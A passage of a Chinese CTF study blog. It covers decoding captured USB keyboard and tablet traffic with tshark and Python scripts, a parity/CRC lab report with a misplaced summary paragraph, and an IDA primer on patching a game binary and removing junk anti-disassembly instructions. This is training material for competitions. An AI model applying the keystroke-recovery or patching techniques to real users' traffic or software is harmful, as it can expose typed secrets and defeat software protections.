class="string">&quot;22&quot;</span>: <span class="string">&quot;%&quot;</span>, <span class="string">&quot;23&quot;</span>: <span class="string">&quot;^&quot;</span>, <span class="string">&quot;24&quot;</span>: <span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;25&quot;</span>: <span class="string">&quot;*&quot;</span>, <span class="string">&quot;26&quot;</span>: <span class="string">&quot;(&quot;</span>, <span class="string">&quot;27&quot;</span>: <span class="string">&quot;)&quot;</span>,</span><br><span class="line">             <span class="string">&quot;28&quot;</span>: <span class="string">&quot;&lt;RET&gt;&quot;</span>, <span class="string">&quot;29&quot;</span>: <span class="string">&quot;&lt;ESC&gt;&quot;</span>, <span class="string">&quot;2a&quot;</span>: <span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>: <span class="string">&quot;\t&quot;</span>, <span class="string">&quot;2c&quot;</span>: <span class="string">&quot;&lt;SPACE&gt;&quot;</span>, <span class="string">&quot;2d&quot;</span>: <span class="string">&quot;_&quot;</span>, <span class="string">&quot;2e&quot;</span>: <span class="string">&quot;+&quot;</span>, <span class="string">&quot;2f&quot;</span>: <span class="string">&quot;&#123;&quot;</span>,</span><br><span class="line">             <span class="string">&quot;30&quot;</span>: <span class="string">&quot;&#125;&quot;</span>, <span class="string">&quot;31&quot;</span>: <span class="string">&quot;|&quot;</span>, <span class="string">&quot;32&quot;</span>: <span class="string">&quot;&lt;NON&gt;&quot;</span>, <span class="string">&quot;33&quot;</span>: <span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;34&quot;</span>: <span class="string">&quot;:&quot;</span>, <span class="string">&quot;35&quot;</span>: <span class="string">&quot;&lt;GA&gt;&quot;</span>, <span class="string">&quot;36&quot;</span>: <span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;37&quot;</span>: <span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;38&quot;</span>: <span class="string">&quot;?&quot;</span>,</span><br><span class="line">             <span class="string">&quot;39&quot;</span>: <span class="string">&quot;&lt;CAP&gt;&quot;</span>, <span class="string">&quot;3a&quot;</span>: <span class="string">&quot;&lt;F1&gt;&quot;</span>, <span class="string">&quot;3b&quot;</span>: <span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>: <span class="string">&quot;&lt;F3&gt;&quot;</span>, <span class="string">&quot;3d&quot;</span>: <span class="string">&quot;&lt;F4&gt;&quot;</span>, <span class="string">&quot;3e&quot;</span>: <span class="string">&quot;&lt;F5&gt;&quot;</span>, <span class="string">&quot;3f&quot;</span>: <span class="string">&quot;&lt;F6&gt;&quot;</span>,</span><br><span class="line">             <span class="string">&quot;40&quot;</span>: <span class="string">&quot;&lt;F7&gt;&quot;</span>, <span class="string">&quot;41&quot;</span>: <span class="string">&quot;&lt;F8&gt;&quot;</span>, <span class="string">&quot;42&quot;</span>: <span class="string">&quot;&lt;F9&gt;&quot;</span>, <span class="string">&quot;43&quot;</span>: <span class="string">&quot;&lt;F10&gt;&quot;</span>, <span class="string">&quot;44&quot;</span>: <span class="string">&quot;&lt;F11&gt;&quot;</span>, <span class="string">&quot;45&quot;</span>: <span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">nums = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&quot;C:\\Users\\SharkChili\\Desktop\\2_10_1.txt&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(line)!=<span class="number">17</span>: <span class="comment">#首先过滤掉鼠标等其他设备的USB流量</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        nums.append(line[<span class="number">0</span>:<span class="number">2</span>]+line[<span class="number">4</span>:<span class="number">6</span>]) </span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">keys.close()</span><br><span class="line">output=[]</span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> nums:</span><br><span class="line">    <span class="keyword">if</span> n[<span class="number">2</span>:<span class="number">4</span>] == <span class="string">&quot;00&quot;</span> :</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> n[<span class="number">2</span>:<span class="number">4</span>] <span class="keyword">in</span> normalKeys:</span><br><span class="line">        <span class="keyword">if</span> n[<span class="number">0</span>:<span class="number">2</span>]==<span class="string">&quot;02&quot;</span>: </span><br><span class="line">            output.append( shiftKeys [n[<span class="number">2</span>:<span class="number">4</span>]])</span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            output.append( normalKeys [n[<span class="number">2</span>:<span class="number">4</span>]])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        output += <span class="string">&#x27;[unknown]&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        a=output.index(<span class="string">&#x27;&lt;DEL&gt;&#x27;</span>)</span><br><span class="line">        <span class="keyword">del</span> output[a]</span><br><span class="line">        <span class="keyword">del</span> output[a-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> output[i]==<span class="string">&quot;&lt;CAP&gt;&quot;</span>:</span><br><span class="line">            flag+=<span class="number">1</span></span><br><span class="line">            output.pop(i)</span><br><span class="line">            <span class="keyword">if</span> flag==<span class="number">2</span>:</span><br><span class="line">                flag=<span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> flag!=<span class="number">0</span>:</span><br><span class="line">            output[i]=output[i].upper()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;output :&#x27;</span> + <span class="string">&quot;&quot;</span>.join(output))</span><br></pre></td></tr></table></figure>
-
-<h4 id="举个例子"><a href="#举个例子" class="headerlink" title="举个例子"></a>举个例子</h4><p>这里以ciscn2022的一道题为例</p>
-<p>打开发现</p>
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230423232631.jpg" alt="QQ截图20230423232631"></p>
-<p>提取出这两个流量</p>
-</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark.exe -r ez_usb.pcapng -Y <span class="string">&#x27;usb.src == 2.8.1&#x27;</span> -T fields -e usbhid.data &gt; 2_8_1.txt</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark.exe -r ez_usb.pcapng -Y <span class="string">&#x27;usb.src == 2.10.1&#x27;</span> -T fields -e usbhid.data &gt; 2_10_1.txt</span><br></pre></td></tr></table></figure>
-
-<p>提取数据的流量</p>
-<p><img src="/./assets/image-20230423233202157.png" alt="image-20230423233202157"></p>
-<p>长的那个是rar压缩包，短的是密码。</p>
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230424100852.jpg" alt="QQ截图20230424100852"></p>
-<h3 id="数位板流量"><a href="#数位板流量" class="headerlink" title="数位板流量"></a>数位板流量</h3><p>数位也算常见的题型了，第一个显著特征是Wacom Co</p>
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230424101244.jpg" alt="QQ截图20230424101244"></p>
-<p>还有一点是他的hiddata有10位(目前遇到的题是这样的)</p>
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230424101426.jpg" alt="QQ截图20230424101426"></p>
-<p>hiddata的10位数据中，前2位是类似标识符的作用，3，4位是数位板移动的X轴,5，6位是数位板的y轴。这里xy是绝对位置，y要加个符号，把图像变到第四象限</p>
-<blockquote>
-<p>第一种<br>第四位代表的就是数位笔是否在数位板上画画，0代表没画，1代表画<br>第五到八位代表的是x坐标<br>第九到十二位代表的是y坐标<br>第十三到十六位代表的是数位笔在数位板上的压感</p>
-<p>第二种<br>第五到八位代表的x坐标,00分隔<br>第十一到十四位代表的y坐标,00分隔<br>第十七和十八位00表示无按压，01表示按压</p>
-</blockquote>
-<p>网上现成的代码</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">data=[]</span><br><span class="line">lines=[]</span><br><span class="line">line=[]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;C:\\Users\\SharkChili\\Desktop\\finall.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">        <span class="keyword">if</span> i!=<span class="string">&#x27;\n&#x27;</span>:</span><br><span class="line">              lines.append(i.strip(<span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line"><span class="comment"># X = []</span></span><br><span class="line"><span class="comment"># Y = []</span></span><br><span class="line">result=<span class="built_in">open</span>(<span class="string">&#x27;xy.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">posx = <span class="number">0</span></span><br><span class="line">posy = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lines:</span><br><span class="line">        <span class="comment"># print(i)</span></span><br><span class="line">        x0=<span class="built_in">int</span>(i[<span class="number">4</span>:<span class="number">6</span>],<span class="number">16</span>)</span><br><span class="line">        x1=<span class="built_in">int</span>(i[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>)</span><br><span class="line">        x=x0+x1*<span class="number">256</span></span><br><span class="line">        y0=<span class="built_in">int</span>(i[<span class="number">8</span>:<span class="number">10</span>],<span class="number">16</span>)</span><br><span class="line">        y1=<span class="built_in">int</span>(i[<span class="number">10</span>:<span class="number">12</span>],<span class="number">16</span>)</span><br><span class="line">        y=y0+y1*<span class="number">256</span></span><br><span class="line">        <span class="comment"># X.append(x)</span></span><br><span class="line">        <span class="comment"># Y.append(-y)</span></span><br><span class="line">        result.write(<span class="built_in">str</span>(x)+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(-y)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment"># fig = plt.figure()</span></span><br><span class="line"><span class="comment"># ax1 = fig.add_subplot(111)</span></span><br><span class="line"><span class="comment"># ax1.set_title(&quot;result&quot;)</span></span><br><span class="line"><span class="comment"># ax1.scatter(X, Y, c=&#x27;b&#x27;, marker=&#x27;o&#x27;)</span></span><br><span class="line"><span class="comment"># plt.show()</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>有PIL库就把注释取消直接跑，没有就存到txt文件中，然后用gnuplot画</p>
-<p>有时候还要根据前2位过滤一下</p>
-<p>这里举个例子</p>
-<p>guodctf的一道题为例</p>
-<p><img src="/./assets/image-20230424111101110.png" alt="image-20230424111101110"></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark.exe -r .\final.pcapng -Y <span class="string">&#x27;usb.src == 2.12.1&#x27;</span> -T fields -e usbhid.data &gt;finall.txt</span><br></pre></td></tr></table></figure>
-
-<p>然后用上面的脚本跑，得到图片</p>
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230424104344.jpg" alt="QQ截图20230424104344"></p>
-<p>看着不太清晰，看一下提取出的数据，发现</p>
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230424111316.jpg" alt="QQ截图20230424111316"></p>
-<p>有两个，一个02f0，一个02f1，分别提取看一下</p>
-<p>修改的代码</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.....</span><br><span class="line"><span class="keyword">if</span> i[<span class="number">0</span>:<span class="number">4</span>]==<span class="string">&#x27;02f0&#x27;</span>: <span class="comment">#02f1</span></span><br><span class="line">    result.write(<span class="built_in">str</span>(x)+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(-y)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">.....   </span><br></pre></td></tr></table></figure>
-
-<p>得到</p>
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230424111702.jpg" alt="QQ截图20230424111702"></p>
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230424111637.jpg" alt="QQ截图20230424111637"></p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-计算机组成原理实验一" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2023/06/01/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E5%AE%9E%E9%AA%8C%E4%B8%80/" class="article-date">
-  	<time datetime="2023-06-01T03:08:58.225Z" itemprop="datePublished">2023-06-01</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="计算机组成原理实验一"><a href="#计算机组成原理实验一" class="headerlink" title="计算机组成原理实验一"></a>计算机组成原理实验一</h1><h2 id="一、实验目的"><a href="#一、实验目的" class="headerlink" title="一、实验目的"></a>一、实验目的</h2><ol>
-<li>理解英文ASCII码和汉字字形码显示的基本原理</li>
-<li>掌握奇偶校验的基本原理及其门电路结构。</li>
-<li>理解海明校验码设计原理与检错、纠错电路设计。</li>
-<li>掌握CRC循环冗余校验码的基本原理和串行&#x2F;并行实现电路。</li>
-</ol>
-<h2 id="二、实验内容"><a href="#二、实验内容" class="headerlink" title="二、实验内容"></a>二、实验内容</h2><ol>
-<li>ASCII码</li>
-<li>汉字字形码</li>
-<li>奇偶校验码</li>
-<li>海明校验码</li>
-<li>CRC校验码</li>
-</ol>
-<h2 id="三、实验步骤"><a href="#三、实验步骤" class="headerlink" title="三、实验步骤"></a>三、实验步骤</h2><h3 id="奇偶校验的基本原理及其门电路结构"><a href="#奇偶校验的基本原理及其门电路结构" class="headerlink" title="奇偶校验的基本原理及其门电路结构"></a>奇偶校验的基本原理及其门电路结构</h3><p>电路图如下</p>
-<p><img src="C:/Users/SharkChili/Desktop/QQ%E6%88%AA%E5%9B%BE20230409152249.jpg" alt="QQ截图20230409152249"></p>
-<table>
-<thead>
-<tr>
-<th>输入端</th>
-<th>校验端</th>
-<th></th>
-</tr>
-</thead>
-<tbody><tr>
-<td>7位原始数值A</td>
-<td>偶校验段Y</td>
-<td>奇校验Y’</td>
-</tr>
-<tr>
-<td>0000000</td>
-<td>0000 0000</td>
-<td>0000 0000</td>
-</tr>
-<tr>
-<td>1010001</td>
-<td>1010 0011</td>
-<td>1010 0010</td>
-</tr>
-<tr>
-<td>1101001</td>
-<td>1101 0010</td>
-<td>1101 0011</td>
-</tr>
-<tr>
-<td>1111111</td>
-<td>1111 1111</td>
-<td>1111 1110</td>
-</tr>
-</tbody></table>
-<h3 id="CRC循环冗余校验码的基本原理和串行-x2F-并行实现电路"><a href="#CRC循环冗余校验码的基本原理和串行-x2F-并行实现电路" class="headerlink" title="CRC循环冗余校验码的基本原理和串行&#x2F;并行实现电路"></a>CRC循环冗余校验码的基本原理和串行&#x2F;并行实现电路</h3><p>①采用CRC校验码实现编码&#x2F;解码，首先选择一个用于在接收端进行梭验时，对接收的帧进行异或运算的除数（二进制数据串，通常以多项方式表示，所以CRC又称多项式编码方法，这个多项式称为“生成多项式”)。这个除数可以随机选将，最大位和最小位必须是1，即格式必须是1xxxx1)，也可以选择以下列表中的标准对应的简记式。</p>
-<p>②10位数据1011000111，CRC-4多项式（即“除数”)X4+X1+X0 (10011)，CRC校验码的编码原理如下图1.5.1左边所示。假设除数的二进制位数为k 位，则在要发送的数据（假设为 m位）后面加上k-1位“0”，然后以这个加了k-1个“0“的新数(m+k-1位)“异或”上面这个选定的除数，所得到的余数（ k-1位比特串）就是该数的CRC校验码，也称之为FCS（帧校验序列)。注意:余数的位数一定要是比选定的除数位数少一位，即使前面的位是0，甚至是全为О(整除时）也都不能省略。下图1.5.1右边显示的是另一种借助串行D触发器链来实现异或的校验码生成方式。</p>
-<p><img src="C:/Users/SharkChili/AppData/Roaming/Typora/typora-user-images/image-20230409160509919.png" alt="image-20230409160509919"></p>
-<p>CRC校验码的译码原理是:把郅达接收端的数据帧异或收发端共同选定的除数。因为在发送端，待传送的数就已通过拼按CRC校验码，做了“去余”处理（即使其能“整除”)，所以异或结果应该是余数0，可以“整除”。若余数不为0，表明该数据帧（包括发送的数据及校验码）在传箱过程中出现差错，同时余数值可推算错误位的位置。</p>
-<p><img src="C:/Users/SharkChili/AppData/Roaming/Typora/typora-user-images/image-20230409160732261.png" alt="image-20230409160732261"></p>
-<table>
-<thead>
-<tr>
-<th align="left">输入端数据DS</th>
-<th>CRC校验码 R</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">0000000000</td>
-<td>0000</td>
-</tr>
-<tr>
-<td align="left">0001110010</td>
-<td>1110</td>
-</tr>
-<tr>
-<td align="left">0101010101</td>
-<td>0010</td>
-</tr>
-<tr>
-<td align="left">1000000001</td>
-<td>1110</td>
-</tr>
-<tr>
-<td align="left">1000011000</td>
-<td>0011</td>
-</tr>
-<tr>
-<td align="left">1011000111</td>
-<td>1101</td>
-</tr>
-<tr>
-<td align="left">1100010001</td>
-<td>0100</td>
-</tr>
-<tr>
-<td align="left">1111111111</td>
-<td>0110</td>
-</tr>
-</tbody></table>
-<h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p>各位同学已经参加协会快2个月了，为检查大家的培训情况举办了这次内部练武赛，比赛结束后会根据解题情况选则相应人数纳入协会。</p>
-<p>赛题内容有密码，web，逆向，三个方向，每个方向大概4道题，平台持续开放一周时间，题目难度不会超过已经培训过的范围。</p>
-<p>各方向的出题详情如下</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-re学习总结" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2023/06/01/re%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" class="article-date">
-  	<time datetime="2023-06-01T03:08:58.223Z" itemprop="datePublished">2023-06-01</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="re学习总结"><a href="#re学习总结" class="headerlink" title="re学习总结"></a>re学习总结</h1><h2 id="软件安装"><a href="#软件安装" class="headerlink" title="软件安装"></a>软件安装</h2><p>安装IDA与DIE</p>
-<h2 id="基础流程"><a href="#基础流程" class="headerlink" title="基础流程"></a>基础流程</h2><ul>
-<li>将文件拖到DIE中查看版本信息</li>
-</ul>
-<p>​			这里最重要的是软件的版本和编译器。</p>
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230114164055.jpg"></p>
-<ul>
-<li>知道版本后用对应的IDA版本打开</li>
-</ul>
-<p>​			打开的时候，软件会自动识别相应的配置，我们一路默认就好</p>
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230114164703.jpg"></p>
-<h2 id="IDA的基础用法"><a href="#IDA的基础用法" class="headerlink" title="IDA的基础用法"></a>IDA的基础用法</h2><p>进入IDA后首先是下面这个页面</p>
-<p>这里称这个界面为<strong>图表视图</strong></p>
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230114164729.jpg"></p>
-<h3 id="Space键"><a href="#Space键" class="headerlink" title="Space键"></a>Space键</h3><p>space键会使我们在<strong>图表视图</strong>和<strong>文本视图</strong>之间相互切换</p>
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230114165430.jpg"></p>
-<h3 id="F5键"><a href="#F5键" class="headerlink" title="F5键"></a>F5键</h3><p>在上面无论哪两个界面，F5都会进入伪代码的页面</p>
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230114165730.jpg"></p>
-<h3 id="X键"><a href="#X键" class="headerlink" title="X键"></a>X键</h3><p>在上述三个页面，选定<strong>函数</strong>、<strong>变量</strong>，再点X键就能查看相关引用</p>
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230114170521.jpg"></p>
-<h3 id="TAB键"><a href="#TAB键" class="headerlink" title="TAB键"></a>TAB键</h3><p>在伪代码、<strong>文本视图</strong>页面，选定函数或者变量，点击TAB，就能进入<strong>图表视图</strong>的页面，再次点击TAB会回到原来的页面</p>
-<h3 id="R键与H键"><a href="#R键与H键" class="headerlink" title="R键与H键"></a>R键与H键</h3><p>R会将数字转换成字符</p>
-<p>H会将10进制转成16进制</p>
-<h3 id="CTRL-F"><a href="#CTRL-F" class="headerlink" title="CTRL+F"></a>CTRL+F</h3><p>在右边的函数框中点击CTRL+F，就能对函数进行搜索</p>
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230114172302.jpg"></p>
-<p>几个指令</p>
-<h3 id="A指令"><a href="#A指令" class="headerlink" title="A指令"></a>A指令</h3><p>把当前的数据用字符串的形式来显示</p>
-<h3 id="C指令"><a href="#C指令" class="headerlink" title="C指令"></a>C指令</h3><p>把当前的数据安照代码（code）的形式来显示</p>
-<h3 id="D指令"><a href="#D指令" class="headerlink" title="D指令"></a>D指令</h3><p>把当前的数据用数据（data）的形式来显示</p>
-<h3 id="U指令"><a href="#U指令" class="headerlink" title="U指令"></a>U指令</h3><p>把当前的数据用普通的原始字节的形式来显示（undefined未定义）</p>
-<h2 id="RE的题型"><a href="#RE的题型" class="headerlink" title="RE的题型"></a>RE的题型</h2><h3 id="简单的改逻辑，改数据"><a href="#简单的改逻辑，改数据" class="headerlink" title="简单的改逻辑，改数据"></a>简单的改逻辑，改数据</h3><p>此类题比较简单，不需要太多的汇编知识，只通过反编译后伪代码就能得到相关的信息，修改关键数据后就能得到Flag</p>
-<p>以这两道题为例</p>
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230115112853.jpg"></p>
-<p>打开后进入按<strong>F5</strong></p>
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230115113410.jpg"></p>
-<p>观察伪代码发现逻辑不难，只要分数大于2018就能给出flag</p>
-<p>所以在代码初始化的时候直接将分数置为2022，这样开局就能得到flag</p>
-<p>显然<code>_startup()</code>是初始化游戏的函数，我们双击函数进入函数内部</p>
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230115113848.jpg"></p>
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230115114012.jpg"></p>
-<p>点击选定score后按<code>TAB</code>进入<strong>图表视图</strong></p>
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230115114749.jpg"></p>
-<p>选定_score后<code>右键</code>，然后选择<code>Keypath</code>&gt;&gt;<code>Pather</code></p>
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230115114943.jpg"></p>
-<p>将初始的0改为16进制的2022(0x7E6)</p>
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230115115240.jpg"></p>
-<p>就修改成功了，最后保存</p>
-<p><code>Edit</code>&gt;&gt;<code>Patch Program</code>&gt;&gt;<code>Apply patches to</code>&gt;&gt;<code>Apply patches</code></p>
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230115115406.jpg"></p>
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230115115416.jpg"></p>
-<p>效果图</p>
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230115115718.jpg"></p>
-<h3 id="花指令"><a href="#花指令" class="headerlink" title="花指令"></a>花指令</h3><blockquote>
-<p>花指令实际上把它按照 “乱指令” 来理解可能更贴切一些。我们知道，汇编语言其实就是机器指令的符号化，从某种程度上看，它只是更容易理解一点的机器指令而已。每一条汇编语句，在汇编时，都会根据 cpu 特定的指令符号表将汇编指令翻译成二进制代码。</p>
-<p>而日常应用中，我们通过 VC 的 IDE 或其它如 OD 等反汇编、反编译软件也可以将一个二进制程序反汇编成汇编代码。机器的一般格式为：指令＋数据。</p>
-<p>而反汇编的大致过程是：首先会确定指令开始的首地址，然后根据这个指令字判断是哪个汇编语句，然后再将后面的数据反汇编出来。由此，我们可以看到，在这一步的反汇编过程中存在漏洞：如果有人故意将错误的机器指令放在了错误的位置，那反汇编时，就有可能连同后面的数据一起错误地反汇编出来，这样，我们看到的就可能是一个错误的反汇编代码。这就是 “花指令”，简而言之，花指令是利用了反汇编时单纯根据机器指令字来决定反汇编结果的漏洞。使得杀毒软件不能正常的判断病毒文件的构造。说通俗点就是 “杀毒软件是从头到脚按顺序来查找病毒。如果我们把病毒的头和脚颠倒位置。杀毒软件就找不到病毒了。”</p>
-</blockquote>
-<p>简而言之，花指令会使IDA中的<code>F5</code>失败</p>
-<p>这时，就要我们手动调整</p>
-<p>我们以一道题为例</p>
-<p>21校赛的AskforU没搞出来，还是得懂汇编，花指令先跳了</p>
-<p>搞了一天，搞出来了</p>
-<p>刚进去看到的是这个样子，由于代码加了花所以对于<code>main()</code>,用<code>F5</code>是没反应的</p>
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230115184015.jpg"></p>
-<p><strong>首先我们明确，.text端中存储的是代码</strong></p>
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230115184641.jpg"></p>
-<p>所以要将所有的数据用<code>C键</code>转换成代码</p>
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230115184405.jpg"></p>
-<p>修改完成之后发现这里有两个看起来像报错的东西，所以汇编可能有问题，我们来仔细分析一下</p>
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230115185131.jpg"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">loc_4014D7:</span><br><span class="line">mov     [ebp-0DCh], eax</span><br><span class="line">call    sub_4018C0</span><br><span class="line">mov     [ebp-0E0h], eax</span><br><span class="line">call    near ptr loc_4014EF+4</span><br><span class="line">jmp     short near ptr loc_4014D7+1</span><br><span class="line">;-----------------------------------------</span><br><span class="line">loc_4014EF:</span><br><span class="line">add     eax, 83000000h</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
-
-<p>这段代码在第三行用<code>call</code>命令调用了<code>sub_4018C0</code>函数，这样是没问题的，因为<code>call</code>命令要调用函数</p>
-<p>但是在第五行，出现了<code>call</code>命令调用<code>loc_4014EF+4</code>，联系后面代码可以看到，<code>loc_4014EF+4</code>是一个地址，所以这条命令是错误的，所以将其置为<code>NOP</code>（<code>选定代码</code>&gt;&gt;<code>D键</code>&gt;&gt;<code>CTRL+N</code>&gt;&gt;<code>C键</code>)</p>
-<p>接着看第六行，通过<code>jmp</code>指令跳转到地址<code>loc_4014D7+1</code>处，第一感觉是没有问题的，但是<code>jmp</code>跳转到相应的地址之后就会执行相应地址存储的代码，，对于上面代码，6位的数据才组成这一段代码，如果<code>loc_4014D7+1</code>处开始就构不成一段代码，所以该条指令是错误的,将其置为<code>NOP</code></p>
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230115191155.jpg"></p>
-<p>对于之后的代码分析也同理。</p>
-<p>将这一大段中所有有问题的代码修改后，我们要让ida将这段代码识别为函数。</p>
-<p>这里先申明一个概念，汇编中的函数必须由<code>retn</code>结尾，而且在函数开始时一般有这种标志</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CC CC CC CC CC CC CC CC CC CC+ align 10h</span><br></pre></td></tr></table></figure>
-
-<p>这个标志的下一行就是函数开始的第一行。</p>
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230115192618.jpg"></p>
-<p>所以，在选定函数的首行后按<code>P键</code>，就能将其识别为函数</p>
-<p>这一段有好几个函数，都仿照上面的操作即可。</p>
